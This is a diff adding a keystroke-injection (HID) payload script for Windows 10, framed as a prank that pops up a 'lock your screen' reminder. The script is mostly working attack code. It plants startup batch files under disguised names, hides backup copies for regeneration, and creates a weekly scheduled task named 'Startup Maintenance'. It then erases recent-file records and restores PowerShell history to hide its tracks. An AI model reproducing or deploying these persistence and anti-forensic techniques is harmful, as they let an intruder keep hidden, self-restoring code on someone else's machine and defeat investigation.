@@ -1,0 +1,127 @@
+# Title:         Friendly Logout Reminder Gremlin
+# Description:   
+# Author:        Hierophant
+# Props:         
+# Version:       1.0 Tested GOOD 201911241000
+# Category:      Persistent Instructional Irritation
+# Target:        Windows 10 (Powershell)
+# Attackmodes:   HID
+#
+# Future mods:   Overwrite files when copying
+#                Forensically spotless cleanup
+#                Giant ASCII art taunt in PS history
+#                Additional regeneration layers
+
+LED SETUP
+ATTACKMODE HID
+
+###
+# # Open PowerShell and give it half a second to load
+###
+
+Q GUI r
+Q DELAY 100
+Q STRING powershell
+Q ENTER
+Q DELAY 500
+
+LED ATTACK
+
+###
+# # Copy the current PowerShell history to a temporary file (to cover our tracks later)
+###
+
+Q STRING Copy-Item -Path '"C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"' -Destination '"C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt.bak"'
+Q ENTER
+Q STRING clear
+Q ENTER
+
+LED STAGE1
+
+###
+# # Build the script pop-up launcher in the current user's Roaming Startup folder
+###
+
+Q STRING New-Item -Path '"C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"' -Name '"WinMsgSvc.bat"' -ItemType '"file"' -Value '"@echo off`nCONSOLESTATE /Hide`nstart /min C:\Users\%USERNAME%\AppData\Roaming\Roaming.bat`nexit"'
+Q ENTER
+Q STRING clear
+Q ENTER
+
+###
+# # Build the actual pop-up script in the current user's Roaming folder
+###
+
+Q STRING New-Item -Path '"C:\Users\$env:username\AppData\Roaming"' -Name '"Roaming.bat"' -ItemType '"file"' -Value '"@echo off`nCONSOLESTATE /Hide`nSTART /B msg %USERNAME% /TIME:60 This message is a persistent reminder to always lock your screen or log out of your session before walking away. Unless you like surprises...`nexit"'
+Q ENTER
+Q STRING clear
+Q ENTER
+
+###
+# # Build the regeneration script in the current user's Roaming Program Maintenance Folder
+###
+
+Q STRING New-Item -Path '"C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Maintenance"' -Name '"regen.bat"' -ItemType '"file"' -Value '"@echo off`nCONSOLESTATE /Hide`ncopy launcher.txt `"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WinMsgSvc.bat`"`ncopy closer.txt `"C:\Users\%USERNAME%\AppData\Roaming\Roaming.bat`"`nexit"'
+Q ENTER
+Q STRING clear
+Q ENTER
+
+###
+# # Copy both original scripts to the Maintenance folder under new names (for obfuscation purposes)
+###
+#+# TODO: Overwrite these files if they already exist (to foil blank-file-rename work-around) 
+###
+
+Q STRING Copy-Item -Path '"C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WinMsgSvc.bat"' -Destination '"C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Maintenance\launcher.txt"'
+Q ENTER
+Q STRING clear
+Q ENTER
+Q STRING Copy-Item -Path '"C:\Users\$env:username\AppData\Roaming\Roaming.bat"' -Destination '"C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Maintenance\closer.txt"'
+Q ENTER
+Q STRING clear
+Q ENTER
+
+###
+# # Schedule task to run regeneration script every Friday at 9:30am (Expect pop-up following Monday on login)
+###
+
+Q STRING SCHTASKS /CREATE /SC WEEKLY /D FRI /TN '"Startup Maintenance"' /TR '"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Maintenance\regen.bat /min"' /ST 09:30
+Q ENTER
+Q STRING y
+Q ENTER
+Q STRING clear
+Q ENTER
+
+LED CLEANUP
+
+###
+# # Delete 'Recent Files' activities previous two minutes, restore original PowerShell history
+###
+#+# TODO: Does running Copy and Remove on same line with ; leave clean PowerShell history file?
+###
+
+Q STRING 'Get-ChildItem $env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations -Recurse -Include *.automaticDestinations-ms | Where-Object { $_.LastWriteTime -GE (Get-Date).AddMinutes(-2) } | Remove-Item'
+Q ENTER
+Q STRING Copy-Item -Path '"C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt.bak"' -Destination '"C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"'
+Q ENTER
+Q STRING Remove-Item -Path '"C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt.bak"'
+Q ENTER
+Q STRING clear
+Q ENTER
+
+###
+# # Leave a taunt in PowerShell history file
+###
+#+# TODO: Build ENORMOUS ASCII art taunt in PowerShell history file
+###
+
+Q STRING \# uwu What\'s this?
+Q ENTER
+
+###
+# # Close PowerShell, leave no immediately visible tracks
+###
+
+Q STRING exit
+Q ENTER
+
+LED FINISH
